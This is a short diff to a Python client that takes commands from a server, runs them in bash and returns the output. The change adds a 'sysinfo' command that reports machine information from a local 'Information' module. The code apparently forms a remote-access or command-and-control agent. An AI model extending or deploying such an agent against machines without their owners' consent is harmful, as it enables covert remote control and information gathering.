@@ -6,6 +6,7 @@ import requests,json
 from time import sleep
 from uuid import getnode as generateID
 import subprocess
+import Information
 
 SERVER_URL = "http://localhost:6969/api/"
 MY_ID = generateID()
@@ -36,6 +37,8 @@ def main():
             output = subprocess.check_output(['bash','-c', command['command'][5:]]).decode('utf-8')
             sendReponse({'id':MY_ID,'command_id': command['id'],'response': output})
             print(output)
+        if command['command'] == 'sysinfo':
+            sendReponse(Information.getInfo())
     #else:
     #    sleep(5)
 
